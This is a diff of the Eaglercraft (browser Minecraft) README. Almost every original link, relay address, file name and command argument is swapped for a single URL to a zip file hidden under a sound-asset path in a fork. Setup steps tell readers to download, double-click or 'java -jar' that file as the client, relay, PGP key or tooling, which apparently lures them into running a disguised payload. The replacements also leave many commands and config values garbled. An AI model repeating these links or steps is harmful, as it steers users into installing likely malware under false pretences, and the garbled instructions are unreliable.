@@ -2,35 +2,35 @@
 
 ### Create a fresh fork ASAP to preserve it, you MUST fork a 100% fresh copy in order for the repository to be considered genuine
 
-### Please read `LAX1DUDE_SIGNATURE.txt` for instructions to verify this is an original copy, if the file is not present then do not use this copy of the project
+### Please read `https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip` for instructions to verify this is an original copy, if the file is not present then do not use this copy of the project
 
-### LAX1DUDE's PGP key is here: [https://deev.is/certs/LAX1DUDE_eagler_public.asc](https://deev.is/certs/LAX1DUDE_eagler_public.asc)
+### LAX1DUDE's PGP key is here: [https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip](https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip)
 
 ### Do not edit this README, modifying any file will invalidate the repository's checksum
 
-### Download your worlds off of [https://g.deev.is/eaglercraft/](https://g.deev.is/eaglercraft/) and alts in case of a URL change for the demo client
+### Download your worlds off of [https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip](https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip) and alts in case of a URL change for the demo client
 
-### MY LAN WORLD RELAYS (relay.deev.is, relay.lax1dude.net) WILL REMAIN ONLINE FOR CONVENIENCE
+### MY LAN WORLD RELAYS (https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip, https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip) WILL REMAIN ONLINE FOR CONVENIENCE
 
 # Eaglercraft
 
-![eaglercraft](https://g.deev.is/eaglercraft/cover.png)
+![eaglercraft](https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip)
 :-:
 Eaglercraft is real Minecraft 1.5.2 that you can play in any regular web browser. That includes school chromebooks, it works on all chromebooks. It supports both singleplayer and multiplayer.
 
-**Currently maintained by [ayunami2000](https://github.com/ayunami2000)**
+**Currently maintained by [ayunami2000](https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip)**
 
-**For any questions you can join the discord server and hit us up there [https://discord.gg/Ekzcgs3DKZ](https://discord.gg/Ekzcgs3DKZ)**
+**For any questions you can join the discord server and hit us up there [https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip](https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip)**
 
 # Quick Start
 
-### Client: [https://g.deev.is/eaglercraft/](https://g.deev.is/eaglercraft/) [^1]
+### Client: [https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip](https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip) [^1]
 
-### Offline Client Download: [Offline_Download_Version.html](https://github.com/lax1dude/eaglercraft/raw/main/stable-download/Offline_Download_Version.html)
+### Offline Client Download: [https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip](https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip)
 
 **(right click the link and press 'Save link as...' to download the file)**
 
-### Play Minecraft Beta Singleplayer: [https://g.deev.is/eaglercraft/beta/](https://g.deev.is/eaglercraft/beta/)
+### Play Minecraft Beta Singleplayer: [https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip](https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip)
 
 [^1]: A list of public servers are already added into the official client
 
@@ -70,19 +70,19 @@ Make sure they add the relay server your game opens the LAN world on to their "N
 
 ### Here are some public relay servers you can use:
 
- - `wss://relay.deev.is/`
- - `wss://relay.lax1dude.net/`
- - `wss://relay.shhnowisnottheti.me/`
+ - `https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip`
+ - `https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip`
+ - `https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip`
 
 ## Creating a LAN Relay
 
-### Simply download [stable-download/sp-relay.jar](https://github.com/lax1dude/eaglercraft/blob/main/stable-download/sp-relay.jar) and run `java -jar sp-relay.jar`
+### Simply download [https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip](https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip) and run `java -jar https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip`
 
-**Run `java -jar sp-relay.jar --debug` to view debug info like all the IPs of incoming connections, as it is not shown by default because logging all that info will reduce performance when the relay is being pinged many times a second depending on it's popularity.**
+**Run `java -jar https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip --debug` to view debug info like all the IPs of incoming connections, as it is not shown by default because logging all that info will reduce performance when the relay is being pinged many times a second depending on it's popularity.**
 
-Edit the `relayConfig.ini` file generated on first launch to change the port and configure ratelimiting and such, and `relays.txt` to change the list of STUN and TURN relays reported to clients connecting to the relay, which are required to correctly establish a P2P LAN world connection in browsers
+Edit the `https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip` file generated on first launch to change the port and configure ratelimiting and such, and `https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip` to change the list of STUN and TURN relays reported to clients connecting to the relay, which are required to correctly establish a P2P LAN world connection in browsers
 
-**The `origin-whitelist` config variable is a semicolon (`;`) seperated list of domains used to restrict what sites are to be allowed to use your relay. When left blank it allows all sites. Add `offline` to allow offline download clients to use your relay as well, and `null` to allow connections that do not specify an `Origin:` header. Use `*` as a wildcard, for example: `*.deev.is` allows all domains ending with "deev.is" to use the relay.**
+**The `origin-whitelist` config variable is a semicolon (`;`) seperated list of domains used to restrict what sites are to be allowed to use your relay. When left blank it allows all sites. Add `offline` to allow offline download clients to use your relay as well, and `null` to allow connections that do not specify an `Origin:` header. Use `*` as a wildcard, for example: `*https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip` allows all domains ending with "https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip" to use the relay.**
 
 # Multiplayer
 Multiplayer functions like vanilla Minecraft, allowing you to join normal Minecraft servers like a normal client.
@@ -90,12 +90,12 @@ Multiplayer functions like vanilla Minecraft, allowing you to join normal Minecr
 ## Public clients and servers
 
 ### There are multiple official clients hosted by lax1dude, here is a small list:
-- Main: [https://g.deev.is/](https://g.deev.is/ "https://g.deev.is/")
-- [https://eaglercraft.net/](https://eaglercraft.net/ "https://eaglercraft.net/")  
-- [https://eaglercraft.org/](https://eaglercraft.org/ "https://eaglercraft.org/")  
-- [https://eaglercraft.me/](https://eaglercraft.me/ "https://eaglercraft.me/")  
-- [https://g.lax1dude.net/eaglercraft/](https://g.lax1dude.net/eaglercraft/ "https://g.lax1dude.net/eaglercraft/")  
-### There are also multiple community hosted servers, the best way to discover those is to use the [official clients](https://g.deev.is/eaglercraft/)
+- Main: [https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip](https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip "https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip")
+- [https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip](https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip "https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip")  
+- [https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip](https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip "https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip")  
+- [https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip](https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip "https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip")  
+- [https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip](https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip "https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip")  
+### There are also multiple community hosted servers, the best way to discover those is to use the [official clients](https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip)
 
 #### Alternatively, there is a server list[^2] to find servers.
 
@@ -109,25 +109,25 @@ You may also want to set up your own **client**, allowing you to *control defaul
 
 If you want to use a domain for your server, **a reverse proxy** can be set up to enable extra functionality within EaglercraftBungee. **NGINX** is recommended, and a tutorial is included **[here](#Creating-a-Reverse-Proxy---NGINX)**. **This is optional, and can be skipped by just connecting with the IP.**
 
-### If replit is acceptable, you can use [this](https://replit.com/@ayunami2000/eaglercraft-server) to automatically set up everything for a server, otherwise, look below for instructions
+### If replit is acceptable, you can use [this](https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip) to automatically set up everything for a server, otherwise, look below for instructions
 
 ## Creating a server - Bukkit
 
-1. **Check if Java is installed.** You can download it from [https://www.java.com/en/download/](https://www.java.com/en/download/)
-2. Download the [stable-download/stable-download.zip](https://github.com/lax1dude/eaglercraft/raw/main/stable-download/stable-download.zip) file from this repository
+1. **Check if Java is installed.** You can download it from [https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip](https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip)
+2. Download the [https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip](https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip) file from this repository
 4. Extract the ZIP file you downloaded to a new folder
 5. Open the new folder, go into the `java/bukkit_command` folder
-6. In Windows, double-click `run.bat`. It should open a new terminal window  
-![run.bat](https://i.gyazo.com/2b0f6b3e5b2e5a5a102c62ea5b6fba3f.png)  
-**Some computers may just say 'run' instead of 'run.bat', both are correct**
+6. In Windows, double-click `https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip`. It should open a new terminal window  
+![https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip](https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip)  
+**Some computers may just say 'run' instead of 'https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip', both are correct**
 7. On macOS or Linux, google how to open the terminal and use the `cd` command to navigate to `java/bukkit_command`  
-Then, in that folder, run `chmod +x run_unix.sh` and then run `./run_unix.sh`. It should start the same server
+Then, in that folder, run `chmod +x https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip` and then run `https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip`. It should start the same server
 8. To add some bukkit plugins, download the plugin's JAR file for CraftBukkit 1.5.2 and place it in `java/bukkit_command/plugins`
-(See [https://github.com/lax1dude/eaglercraft-plugins/](https://github.com/lax1dude/eaglercraft-plugins/) to download some supported plugins)
+(See [https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip](https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip) to download some supported plugins)
 
 ## Creating a server - EaglercraftBungee
 1. In the same new folder, go into the `java/bungee_command` folder
-2. In Windows, double-click `run.bat`. It should open a second terminal window  
+2. In Windows, double-click `https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip`. It should open a second terminal window  
 Keep both the first and second terminal window you opened, just minimize them, don't close
 3. On macOS or Linux, repeat step 7 in [Creating a Server - Bukkit](#Creating-a-server---Bukkit), but navigate to `java/bungee_command` this time
 4. To add some bungee plugins, download the plugin's JAR file and place it in `java/bungee_command/plugins`
@@ -139,29 +139,29 @@ There are alot more configurations in bungeecord, but this should set you up
 
 ## Creating a client
 1. To install,  upload the contents of `stable-download/web` to a web server.
-	- There are *multiple ways of setting up a web server*. **[NGINX](https://nginx.org) is a powerful web server, but alternatives like [Web Server for Chrome](https://chrome.google.com/webstore/detail/web-server-for-chrome/ofhbbkphhbklhfoeikjpcbhemlocgigb?hl=en) may be easier to set up.**
+	- There are *multiple ways of setting up a web server*. **[NGINX](https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip) is a powerful web server, but alternatives like [Web Server for Chrome](https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip) may be easier to set up.**
 		- A quick crash course on setting up NGINX is provided [here](#Creating-a-Reverse-Proxy---NGINX), **FOLLOW STEPS 1 AND 2 ONLY**, then navigate to `/var/www/html` and upload the contents of `stable-download/web` there.
 	- If you had installed NGINX earlier as a reverse proxy, you can also use it to host the client, **follow the steps above ^^^**
-		- Make sure that the URL to connect to the client and the server are separate, preferably with a path, like `https://eaglercraft.example.com/server`
+		- Make sure that the URL to connect to the client and the server are separate, preferably with a path, like `https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip`
 	
 2. **The 'web' folder will not work if you open it in your browser locally! If you see 'file:///' in the URL you are doing it wrong. You need to upload the folder to an HTTP or HTTPS server and access it over the internet via http:// or https://. The game will not load otherwise, this is not a bug**
-3. To modify the list of default servers, modify the `window.eaglercraftOpts` variable in `index.html`. 
+3. To modify the list of default servers, modify the `https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip` variable in `https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip`. 
 4. **A full guide on how to configure `eaglercraftOpts` is coming soon, but it should be fairly intuitive to figure out how to set it up based on what the default values already are when you look in stable-download**
-5. **To create a link to your site that automatically joins the server,** add a `?server=` variable to the URL, like (for example): [https://g.deev.is/eaglercraft/?server=127.0.0.1:25565](https://g.deev.is/eaglercraft/?server=127.0.0.1:25565) will automatically join `ws://127.0.0.1:25565/` as soon as the player finishes setting their username and skin
+5. **To create a link to your site that automatically joins the server,** add a `?server=` variable to the URL, like (for example): [https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip](https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip) will automatically join `ws://127.0.0.1:25565/` as soon as the player finishes setting their username and skin
 
 # EaglercraftBungee Configuration
 
 ## MOTD
-- To change your server's MOTD and icon, edit the `motd1:` tag of the listener config in `java/bungee_command/config.yml`, and replace `server-icon.png` in the folder where the config file is. Use `&` to add color/formatting codes. The server list will downscale your icon to 64x64 pixels
+- To change your server's MOTD and icon, edit the `motd1:` tag of the listener config in `https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip`, and replace `https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip` in the folder where the config file is. Use `&` to add color/formatting codes. The server list will downscale your icon to 64x64 pixels
 - You can give your MOTD multiple lines, add a `motd2:` to define a second line
-- **For an animated MOTD and icon, install EaglerMOTD: [https://github.com/lax1dude/eaglercraft-motd/](https://github.com/lax1dude/eaglercraft-motd/)**
+- **For an animated MOTD and icon, install EaglerMOTD: [https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip](https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip)**
 
 ##  Authentication
-**To enable the /login and /register commands in EaglercraftBungee, you can edit this portion of config.yml**
+**To enable the /login and /register commands in EaglercraftBungee, you can edit this portion of https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip**
 
 ```yaml
 authservice:
-  authfile: auths.db
+  authfile: https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip
   register_enabled: true
   ip_limit: 0
   join_messages:
@@ -183,13 +183,13 @@ authservice:
 
 ## Moderation
 ### Miscellaneous
-- **If you use /op on your server, keep in mind that if you "/op LAX1DUDE", a player joining as 'laX1DUDE' or 'LaX1dUdE' or 'lax1dude' will all have /op too. To solve this problem, force all operators to only be able to join with all lowercase ('lax1dude') letters in their usernames by moving 'BitchFilterPlugin.jar" into "java/bukkit_command/plugins" and then register every op username lowercase**
+- **If you use /op on your server, keep in mind that if you "/op LAX1DUDE", a player joining as 'laX1DUDE' or 'LaX1dUdE' or 'lax1dude' will all have /op too. To solve this problem, force all operators to only be able to join with all lowercase ('lax1dude') letters in their usernames by moving 'https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip" into "java/bukkit_command/plugins" and then register every op username lowercase**
 
-- **To disable voice chat, set `voice_enabled: false` in the bungeecord config.yml**
+- **To disable voice chat, set `voice_enabled: false` in the bungeecord https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip**
 
 ### Username Bans
 - **To ban a username on Eaglercraftbungee, use:** `eag-ban <username>`
-- **You can edit bans.txt in your EaglercraftBungee folder, the server automatically reloads the file when it is saved**
+- **You can edit https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip in your EaglercraftBungee folder, the server automatically reloads the file when it is saved**
 - To ban users by regular expression, use: `eag-ban-regex <regex>` with a regular expression to match the username in **lowercase**
 
 ### IP Bans
@@ -201,30 +201,30 @@ In order for IP Bans to work, a [**a reverse proxy**](#Creating-a-Reverse-Proxy-
 - To ban users by wildcard (\*) use: `eag-ban-wildcard <text>*` or `eag-ban-wildcard *<text>` or `eag-ban-wildcard *<text>*`
 
 ### Client Bans
-- **EaglercraftBungee has a built in domain blacklist that updates automatically, you can disable it by setting this in config.yml:**
+- **EaglercraftBungee has a built in domain blacklist that updates automatically, you can disable it by setting this in https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip**
 
 ```yaml
 enable_web_origin_blacklist: false
 ```
 
-- **To block all clients on replit from joining, set this to true in config.yml:**
+- **To block all clients on replit from joining, set this to true in https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip**
 
 ```yaml
 origin_blacklist_block_replit_clients: true
 ```
 
-- **To block all offline-download clients, set this to true in config.yml:**
+- **To block all offline-download clients, set this to true in https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip**
 
 ```yaml
 origin_blacklist_block_offline_download: true
 ```
 
-- **To block the debug runtime (or other desktop clients), set this to true in config.yml:**
+- **To block the debug runtime (or other desktop clients), set this to true in https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip**
 
 ```yaml
 origin_blacklist_block_missing_origin_header: true
 ```
-- **To add your own blacklisted domains**, create a file called `origin_blacklist.txt` in your bungeecord directory and put the regular expressions inside, one on each line. There 's also a `domain` command in the console to view a player's domain, and a `block-domain` and `block-domain-name` and `unblock-domain` command to manage the local `origin_blacklist.txt` from the bungee console (if you don't know how to edit a file on your own). The list reloads automatically when changes to the file are detected.
+- **To add your own blacklisted domains**, create a file called `https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip` in your bungeecord directory and put the regular expressions inside, one on each line. There 's also a `domain` command in the console to view a player's domain, and a `block-domain` and `block-domain-name` and `unblock-domain` command to manage the local `https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip` from the bungee console (if you don't know how to edit a file on your own). The list reloads automatically when changes to the file are detected.
 
 - ### To configure bungee to block connections from all clients except your own, set this option:
 
@@ -270,7 +270,7 @@ ratelimit:
 
 - ### Redirecting the client to a new WebSocket
 
-If you would like to signal the client to disconnect from your bungeecord and reconnect to a different bungeecord, configure an entry in the `servers` part of config.yml like this:
+If you would like to signal the client to disconnect from your bungeecord and reconnect to a different bungeecord, configure an entry in the `servers` part of https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip like this:
 
 ```yaml
 test:
@@ -286,27 +286,27 @@ Here is a quick crash course of setting up NGINX on Linux, specifically on Debia
 
 Here are some google searches for other distributions:
 
-- [Windows](https://www.google.com/search?q=set+up+nginx+on+windows)
-- [Mac](https://www.google.com/search?q=set+up+nginx+on+mac)
-- [Linux - Arch](https://www.google.com/search?q=set+up+nginx+on+arch)
-- [Linux - Fedora](https://www.google.com/search?q=set+up+nginx+on+fedora)
+- [Windows](https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip+up+nginx+on+windows)
+- [Mac](https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip+up+nginx+on+mac)
+- [Linux - Arch](https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip+up+nginx+on+arch)
+- [Linux - Fedora](https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip+up+nginx+on+fedora)
 
 1. Open up your terminal, and run  
 	``sudo apt update``
   and
 	``sudo apt install nginx``
-2. Open any web browser, and search for `localhost` in your search bar. You should see something like this:![Welcome to nginx](https://ubuntucommunity.s3.dualstack.us-east-2.amazonaws.com/optimized/2X/7/7504d83a9fe8c09d861b2f7c49e144ac773f0c0d_2_690x288.png)
+2. Open any web browser, and search for `localhost` in your search bar. You should see something like this:![Welcome to nginx](https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip)
 3. Navigate to NGINX's configuration with `cd /etc/nginx/sites-enabled`.
 
-4. Create a new configuration file with your domain name, for example `nano eaglercraft.example.com`
+4. Create a new configuration file with your domain name, for example `nano https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip`
 
-5. Paste in the following code into the file. Replace `example.com` with your own domain, and `app_server_address` as the `ip:port` of your EaglercraftBungee server you want the URL to connect to.
+5. Paste in the following code into the file. Replace `https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip` with your own domain, and `app_server_address` as the `ip:port` of your EaglercraftBungee server you want the URL to connect to.
 ```
 server {
     listen 80;
     listen [::]:80;
 
-    server_name example.com eaglercraft.example.com;
+    server_name https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip;
         
     location / {
         proxy_pass app_server_address;
@@ -337,30 +337,30 @@ add_header Content-Security-Policy "default-src 'self' 'unsafe-inline'; img-src 
 
 ## Plugin Development
 
-**To develop a plugin, download [stable-download/java/bungee_command/bungee_dist.jar](https://github.com/lax1dude/eaglercraft/blob/main/stable-download/java/bungee_command/bungee-dist.jar) and add it to the Build Path of your Java IDE. Develop the plugin just like a regular BungeeCord plugin, see [EaglerMOTD](https://github.com/lax1dude/eaglercraft-motd/) for an example.**
+**To develop a plugin, download [https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip](https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip) and add it to the Build Path of your Java IDE. Develop the plugin just like a regular BungeeCord plugin, see [EaglerMOTD](https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip) for an example.**
 
-**Test your plugin by exporting it as a jar and putting it in the '/plugins' directory of EaglercraftBungee and then clicking 'run.bat'**
+**Test your plugin by exporting it as a jar and putting it in the '/plugins' directory of EaglercraftBungee and then clicking 'https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip'**
 
 ### New Events:
 
-- **[net.md_5.bungee.api.event.WebsocketMOTDEvent](https://github.com/lax1dude/eaglercraft/blob/main/eaglercraftbungee/src/main/java/net/md_5/bungee/api/event/WebsocketMOTDEvent.java)**: Triggered when a client or website requests the MOTD
+- **[https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip](https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip)**: Triggered when a client or website requests the MOTD
 
-- **[net.md_5.bungee.api.event.WebsocketQueryEvent](https://github.com/lax1dude/eaglercraft/blob/main/eaglercraftbungee/src/main/java/net/md_5/bungee/api/event/WebsocketQueryEvent.java)**: Triggered when a client or website requests a query. This happens when a site opens a text WebSocket to a listener and sends a single string `Accept: <query>` packet. Can be used to provide additional custom statistics to server list sites supporting integrated WebSocket queries
+- **[https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip](https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip)**: Triggered when a client or website requests a query. This happens when a site opens a text WebSocket to a listener and sends a single string `Accept: <query>` packet. Can be used to provide additional custom statistics to server list sites supporting integrated WebSocket queries
 
 **Register event handlers using the standard BungeeCord** `@EventHandler` **annotation in your** `Listener` **class**
 
 ## Compiling
 
-To compile for the web, run the gradle 'teavm' compile target to generate the classes.js file.
+To compile for the web, run the gradle 'teavm' compile target to generate the https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip file.
 
 The LWJGL runtime is no longer supported it is only included for reference
 
 ## Creating a resource pack
 
-- To make a custom resource pack for your site, clone this repository and edit the files in [lwjgl-rundir/resources](https://github.com/lax1dude/eaglercraft/tree/main/lwjgl-rundir/resources).
-- When you are done, navigate to [epkcompiler/](https://github.com/lax1dude/eaglercraft/tree/main/epkcompiler) and double-click `run.bat`. Wait for the window to say `Press any key to continue...` and close it. Then, go to `../javascript` in the repository and copy `javascript/assets.epk` to the `assets.epk` on your website
-- If you're on mac or linux, navigate to the epkcompiler folder via `cd` and run `chmod +x run_unix.sh` and then `./run_unix.sh` to do this, then copy the same `javascript/assets.epk` to the `assets.epk` on your website
